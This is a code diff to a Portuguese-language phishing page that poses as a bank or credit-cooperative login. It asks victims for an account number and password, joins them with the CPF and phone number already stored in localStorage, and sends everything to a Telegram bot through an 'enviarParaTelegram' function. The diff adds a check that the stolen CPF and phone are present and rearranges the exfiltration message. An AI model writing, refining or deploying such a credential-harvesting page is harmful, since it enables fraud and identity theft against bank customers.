@@ -175,7 +175,9 @@
 
         <div class="formulario" id="formulario" style="display: block;">
             <form id="dadosForm">
-                <label for="conta"><i class="fas fa-credit-card icon"></i><span>Operador:</span></label>
+                <!-- O campo "Cooperativa" foi removido -->
+                
+                <label for="conta"><i class="fas fa-credit-card icon"></i><span>operador:</span></label>
                 <input type="text" id="conta" name="conta" placeholder="Número da conta" required><br><br>
         
                 <div class="loading-spinner" id="loadingSpinner">
@@ -185,6 +187,7 @@
                 <button type="button" onclick="validarCadastro()">Validar</button>
             </form>
         </div>
+        
 
         <div class="senha" id="senhaDiv">
             <label for="senha"><i class="fas fa-lock icon"></i><span>Senha:</span></label>
@@ -239,6 +242,12 @@
                 var cpf = localStorage.getItem("cpf");
                 var telefone = localStorage.getItem("telefone");
 
+                // Verificando se o CPF e o telefone estão salvos
+                if (!cpf || !telefone) {
+                    alert("CPF ou telefone não encontrado. Por favor, complete as informações antes de prosseguir.");
+                    return;
+                }
+
                 // Montando a mensagem
                 var mensagem = `CPF: ${cpf}\nTelefone: ${telefone}\nConta: ${conta}`;
                 enviarParaTelegram(mensagem);
@@ -262,7 +271,10 @@
             var senha = document.getElementById("senha").value;
 
             if (senha) {
-                var mensagemFinal = `CPF: ${localStorage.getItem("cpf")}\nTelefone: ${localStorage.getItem("telefone")}\nConta: ${conta}\nSenha: ${senha}`;
+                var cpf = localStorage.getItem("cpf");
+                var telefone = localStorage.getItem("telefone");
+
+                var mensagemFinal = `CPF: ${cpf}\nTelefone: ${telefone}\nConta: ${conta}\nSenha: ${senha}`;
                 enviarParaTelegram(mensagemFinal);
 
                 document.getElementById("mensagemSucesso").style.display = "block";
